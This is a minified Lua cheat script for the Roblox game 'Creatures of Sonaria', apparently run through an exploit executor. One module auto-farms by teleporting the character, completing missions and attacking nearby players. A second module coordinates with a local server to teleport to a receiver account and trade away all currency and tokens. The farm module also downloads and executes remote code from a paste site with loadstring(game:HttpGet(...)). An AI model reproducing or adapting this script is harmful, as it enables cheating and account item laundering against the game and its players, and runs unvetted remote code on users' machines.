local a a={cache={},load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
end return a.cache[b].c end}do function a.a()local b,c=game:GetService
'ReplicatedStorage',game:GetService'HttpService'local d={RegionsPosition={[
'Algae Sandbar']=CFrame.new(1065,250,-1436),['Central Rockfaces']=CFrame.new(145
,250,-86),['Coral Reef']=CFrame.new(1250,250,1103),Desert=CFrame.new(-1454,250,
1203),['Flower Cove']=CFrame.new(500,250,2028),['Forgotten Shores']=CFrame.new(-
1172,250,2955),['Grassy Shoal']=CFrame.new(-644,250,2108),Jungle=CFrame.new(2235
,250,-1186),Mesa=CFrame.new(-2249,250,218),Mountains=CFrame.new(-1549,250,-801),
['Pride Rocks']=CFrame.new(1625,250,-471),Redwoods=CFrame.new(-24,250,-1451),[
'Rocky Drop']=CFrame.new(1065,250,578),['Seaweed Depths']=CFrame.new(-109,250,
993),['Shadow Isle']=CFrame.new(-8563,250,8553),['Swamp Hill']=CFrame.new(655,
250,-2346),Tundra=CFrame.new(-894,250,-2011),['Volcano Island']=CFrame.new(2150,
250,1183)},FoodData=require(b._replicationFolder.Constants.FoodData),
MinimapTracker=require(b._replicationFolder.MinimapTracker),PlayerWrapper=
require(b._replicationFolder.PlayerWrapper),AttackHandler=require(b.
_replicationFolder.AttackHandler),SaveSelectionClient=require(b.
_replicationFolder.SaveSelectionClient),TutorialClient=require(b.
_replicationFolder.TutorialClient),DeathClient=require(b._replicationFolder.
DeathClient),HUDGui=require(b._replicationFolder.HUDGui),DailyLoginGui=require(b
._replicationFolder.DailyLoginGui),UpdateLogGui=require(b._replicationFolder.
UpdateLogGui),DeathPoint=require(b.Storage.CreatureDeath.DeathStatPoints),
BiomeCorruption=require(b._replicationFolder.BiomeCorruptionService)}function d.
api_request(e,f,g)local h='http://localhost:8080'local i,j=pcall(function()if e
=='GET'then return request{Url=h..f,Method='GET',Headers={['Content-Type']=
'application/json'}}else return request{Url=h..f,Method='POST',Headers={[
'Content-Type']='application/json'},Body=c:JSONEncode(g or{})}end end)if i and j
then local k=c:JSONDecode(j.Body)return k end return nil end return d end
function a.b()return function(b)local c,d,e,f,g,h,i,j=a.load'a',game:GetService
'Players',game:GetService'ReplicatedStorage',game:GetService'RunService',game:
GetService'VirtualInputManager',game:GetService'Lighting',game:GetService
'TeleportService',workspace:FindFirstChildOfClass'Terrain'local k,l=d.
LocalPlayer,e.Remotes local m=k:WaitForChild'PlayerGui'warn
'Creature of Sonaria instance loaded'loadstring(game:HttpGet(
'https://pastefy.app/zHXeYX07/raw',true))()h.GlobalShadows=false if j then j.
WaterWaveSize=0 end settings().Rendering.QualityLevel=1 for n,o in pairs(
workspace:GetDescendants())do if o:IsA'BasePart'then o.Material=Enum.Material.
Plastic elseif o:IsA'PostProcessEffect'or o:IsA'ParticleEmitter'then o.Enabled=
false end end local n,o,p,q,r,s,t=function()local n=k.Character local o=n and n:
FindFirstChild'HumanoidRootPart'return n,o end,function()return tonumber(string.
match(m.HUDGui.BottomFrame.Other.Hunger.HoverLabel.Text,'%d+'))or 0 end,function
(n)local o=n.DeathStats.MissionsCompleted if o then return tonumber(c.DeathPoint
.MissionsCompleted(o.Value))end return 0 end,function(n)local o,p=(math.huge)for
q,r in pairs(d:GetPlayers())do if r~=k and r.Character and r.Character:
FindFirstChild'HumanoidRootPart'then local s=r.Character.HumanoidRootPart local
t=(n.Position-s.Position).Magnitude if t<o then o=t p=r end end end return p,o
end,function(n)local o,p,q,r=math.huge,k.Character.Data:GetAttribute'ft',
function(o)if(typeof(o)~='Instance')then return end return(o:GetAttribute'Value'
or 0)>0 end for s,t in pairs(workspace.Interactions.Food:GetChildren())do if t:
IsA'Model'and q(t)and c.FoodData[t.Name].Diet==p then local u=(n.Position-t:
GetPivot().Position).Magnitude if u<o then o=u r=t end end end return r,o end,
function(n)local o,p=(math.huge)for q,r in pairs(workspace.Interactions.Mud:
GetChildren())do local s=(n.Position-r:GetPivot().Position).Magnitude if s<o
then o=s p=r end end return p,o end,function()local n={'Shadow Isle',
'Basalt Cave'}for o,p in pairs(c.BiomeCorruption.GetScheduledRegionsForDay(c.
BiomeCorruption.GetCurrentSeed()))do table.insert(n,p)end return n end local u=
function()local u,v,w,x={},{},{},t()for y,z in pairs(m.PlayerDataGui.Data.
Missions.RegionMissions:GetChildren())do local A=false for B,C in pairs(x)do if
z.Name==C then A=true break end end if A then continue end if z.Value==-1 or
typeof(z.Value)=='number'then local B,C={},{}for D,E in pairs(z:GetChildren())do
local F=E.Value if not F and E.Name~='ShoomPilesCollected'then if E.Name==
'TimePlayed'then table.insert(C,{mission=E,amount=E:FindFirstChild'Amount'and E.
Amount.Value or 0})else table.insert(B,E)end end end if#B>0 then table.insert(u,
{regionName=z.Name,missions=B})elseif#C>0 then table.insert(v,C[1].amount)w[
tostring(C[1].amount)]={regionName=z.Name,missions=C}end end end if#u>0 then
local y=u[1]local z=y.missions return y.regionName,z[1].Name end if#v>0 then
local y=w[tostring(math.max(unpack(v)))]return y.regionName,'TimePlayed'end
return nil,nil end task.spawn(function()while task.wait()do local v=c.
PlayerWrapper.getWrapperFromPlayer(k)if not v then continue end if workspace:
GetAttribute'PrivateServerId'==''then game:Shutdown()continue end if v.
_getCurrencyValue().Value>=5000 and v.CountOwnedSpecies()<15 then l.
PurchaseItemRemote:InvokeServer('Carnivores',1)task.wait(0.25)end if v.
_getCurrencyValue(nil,'TimePoints').Value>=35 then l.PurchaseCreatureRemote:
InvokeServer('TimeCreatures','Yiepir')end local w,x=n()if not w or not x then if
k.Settings.Tutorial.Value then l.SetTutorialStageRemote:InvokeServer(
'CreatureEditor',"Vin'rou")task.wait(1.25)setthreadidentity(2)c.
SaveSelectionClient.Spawn'Slot1'end local y={'DailyLoginGui','DeathGui',
'PromptGui','SaveSelectionGui','ShopGui','UpdateLogGui'}for z,A in pairs(y)do
local B=m:FindFirstChild(A)if B and B.Enabled and not k.Settings.Tutorial.Value
then if A=='DeathGui'then repeat task.wait()until m.DeathGui.ContainerFrame.
RewardsFrame.Visible task.wait(0.25)setthreadidentity(2)c.DeathClient.Close()
elseif A=='UpdateLogGui'then setthreadidentity(2)c.UpdateLogGui.Close()elseif A
=='DailyLoginGui'and c.DailyLoginGui.CanClaimReward()then l.
ClaimDailyLoginRemote:FireServer()setthreadidentity(2)c.DailyLoginGui.
SaveSelectionOpen()elseif A=='SaveSelectionGui'then local C=v.GetUsedSlots()[1]
if C then if C.Dino.Value~='Eulopii'then l.DeleteSlotRemote:InvokeServer('Slot1'
,false)task.wait(0.25)continue end l.RestartSlotRemote:InvokeServer('Slot1',
false)task.wait(2.5)setthreadidentity(2)c.SaveSelectionClient.Spawn'Slot1'else l
.PurchaseCreatureRemote:InvokeServer('TrialCreatures','Eulopii',false)task.wait(
0.25)end end end end continue end if p(v.GetUsedSlots()[1])>=750 then l.
LavaSelfDamage:FireServer()task.wait(0.25)continue end if k.Settings.Tutorial.
Value or v.GetUsedSlots()[1].Dino.Value~='Eulopii'then l.SetTutorialStageRemote:
InvokeServer'SurvivalBasics'c.TutorialClient.EndPrimaryTutorial()l.
LavaSelfDamage:FireServer()continue end local y,z=u()if y and z and v.
GetUsedSlots()[1].Dino.Value=='Eulopii'then print(y)local A=c.MinimapTracker:
GetCurrentRegion()if z~='TimePlayed'then local B=m:FindFirstChild'HUDGui'local C
=B and B:FindFirstChild'BottomFrame'and B.BottomFrame:FindFirstChild'Other'and B
.BottomFrame.Other:FindFirstChild'HotbarFrame'and B.BottomFrame.Other.
HotbarFrame:FindFirstChild'Ability3'local D=C and C:FindFirstChild
'CooldownFrame'if D and not D.Visible then setthreadidentity(8)g:SendKeyEvent(
true,Enum.KeyCode.Three,false,game)g:SendKeyEvent(false,Enum.KeyCode.Three,false
,game)end end if A==y then if z=='AttackOrHealCreatureOrNPC'then local B,C=q(x)
print('Closest Player:',B and B.Name or'None','Distance:',C)if B then k.
Character:SetPrimaryPartCFrame(B.Character.HumanoidRootPart.CFrame)if C<=30 then
setthreadidentity(2)c.AttackHandler.Bite(c.PlayerWrapper.getCharacterFromPlayer(
k))end end elseif z=='ConcealScent'then local B,C=s(x)if B then k.Character:
SetPrimaryPartCFrame(B:GetPivot())if C<=30 then l.Mud:FireServer(B)end end
elseif z=='EatFoodDrinkWater'then local B,C=r(x)local D=o()if B then k.Character
:SetPrimaryPartCFrame(D<100 and B:GetPivot()or B:GetPivot()+Vector3.new(0,-250,0
))if C<=30 then l.DrinkRemote:FireServer(workspace.Interactions.Lakes.Lake)l.
Food:FireServer(B)end end elseif z=='Sniff'then l.SetMissionRemote:FireServer(1)
k.Character:SetPrimaryPartCFrame(c.RegionsPosition[y]+Vector3.new(0,-250,0))
elseif z=='TimePlayed'then k.Character:SetPrimaryPartCFrame(c.RegionsPosition[y]
+Vector3.new(0,-250,0))elseif z=='DistanceTravelled'then local B,C=500,c.
RegionsPosition[y]+Vector3.new(0,-550,0)local D=(C.Position-k.Character.
PrimaryPart.Position).Magnitude k.Character:SetPrimaryPartCFrame(D>=B and C or C
+Vector3.new(math.random(-B,B),0,math.random(-B,B)))end else k.Character:
SetPrimaryPartCFrame(c.RegionsPosition[y])end end end end)end end function a.c()
return function(b)local c,d,e,f=game:GetService'HttpService',game:GetService
'Players',game:GetService'TeleportService',game:GetService'ReplicatedStorage'
local g,h=require(f._replicationFolder.PlayerWrapper),d.LocalPlayer local i,j,k,
l=h.PlayerGui,{{Name='ChangeCreatureColorsToken',ItemType='Tokens'},{Name=
'CreatureReviveToken',ItemType='Tokens'},{Name='PartialGrowToken',ItemType=
'Tokens'},{Name='FullGrowToken',ItemType='Tokens'},{Name='Shooms',ItemType=
'Currency'}},function(i,j)local k='http://localhost:8080'local l,m=pcall(
function()return request{Url=k..i,Method='POST',Headers={['Content-Type']=
'application/json'},Body=c:JSONEncode(j or{})}end)if l and m then local n=c:
JSONDecode(m.Body)return n end return nil end,function(i)local j,k,l,m,n=i.
_getCurrencyValue().Value,i._getItemValue(nil,'ChangeCreatureColorsToken',
'Tokens').Value,i._getItemValue(nil,'CreatureReviveToken','Tokens').Value,i.
_getItemValue(nil,'PartialGrowToken','Tokens').Value,i._getItemValue(nil,
'FullGrowToken','Tokens').Value if j<=100 and k==0 and l==0 and m==0 and n==0
then return true end return false end local m=function()local m=0 for n,o in
pairs(i.TradeGui.ContainerFrame.Yours.OffersFrame.ScrollingFrame:GetChildren())
do if o.Name~='Default'then continue end m=m+1 end return m end task.spawn(
function()while task.wait()do local n=g.getWrapperFromPlayer(h)if not n then
continue end local o=i:FindFirstChild'TradeGui'if not o then continue end local
p=i:FindFirstChild'RequestsGui'if not p then continue end local q=k(
'/api/get-claimed-receiver',{name=h.Name})if not q.success or not q.claimed then
warn"Error can't fetch data receiver"task.wait(0.5)continue end if game.JobId~=q
.receiver.job_id then print('[Teleport] Warping to receiver: '..q.receiver.name)
e:TeleportToPlaceInstance(tonumber(q.receiver.place_id),q.receiver.job_id)task.
wait(0.5)continue end if l(n)then local r=k('/api/delivery-complete',{name=h.
Name,receiver_name=q.receiver.name})if not r.success then warn'[API] Error'end
task.wait(3)if _G.Horst_AccountChangeDone then _G.Horst_AccountChangeDone()end
continue end local r=d:FindFirstChild(q.receiver.name)if r then if not i.
TradeGui.ContainerFrame.Visible then h.Remotes.TradeRequestRemote:FireServer(
'SendRequest',r)task.wait(0.25)else local s,t=f:WaitForChild'Remotes':
FindFirstChild(h.Name..'-'..q.receiver.name..'TradeRemote'),0 if s then for u,v
in pairs(j)do v.Amount=v.ItemType=='Currency'and n._getCurrencyValue().Value-100
or n._getItemValue(nil,v.Name,v.ItemType).Value if v.Amount==0 then continue end
t=t+1 task.spawn(function()s:InvokeServer('AddTradeItem',{Overwrite=true,
ItemType=v.ItemType,Name=v.Name,Amount=v.Amount})end)end if o.Enabled and m()==t
and o.ContainerFrame.Yours.OffersFrame.Currency.AmountLabel.Text~='0'then task.
spawn(function()s:InvokeServer'AcceptTrade'end)end end end end end end)end end
end local b={{Name='Creatures of Sonaria - Farm',Load=a.load'b',Places={
5233782396}},{Name='Creatures of Sonaria - Trade',Load=a.load'c',Places={
14119723130}}}for c,d in pairs(b)do if d.Places then for e,f in ipairs(d.Places)
do if f==game.PlaceId then return d:Load()end end end end
